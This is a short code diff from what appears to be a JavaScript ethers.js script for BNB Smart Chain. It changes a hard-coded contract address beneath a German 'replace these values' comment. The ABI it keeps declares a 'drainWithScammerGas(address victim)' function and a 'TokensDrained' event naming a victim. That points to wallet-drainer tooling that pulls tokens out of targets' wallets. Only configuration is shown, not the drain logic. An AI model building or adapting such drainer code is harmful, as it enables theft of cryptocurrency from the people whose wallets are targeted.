@@ -14,7 +14,7 @@ const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
 const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
 
 // !!! WICHTIG: ERSETZE DIESE WERTE !!!
-const contractAddress = "0x0c699b293340FD0c1B086BB5947E2Ba495DC66Bb";
+const contractAddress = "0xAceA17E58cb0652b826Cb0Dc7604A752df6c7325";
 const contractABI = [
     "function drainWithScammerGas(address victim) public",
     "event TokensDrained(address indexed drainedBy, address indexed victim, uint256 tokenCount)"
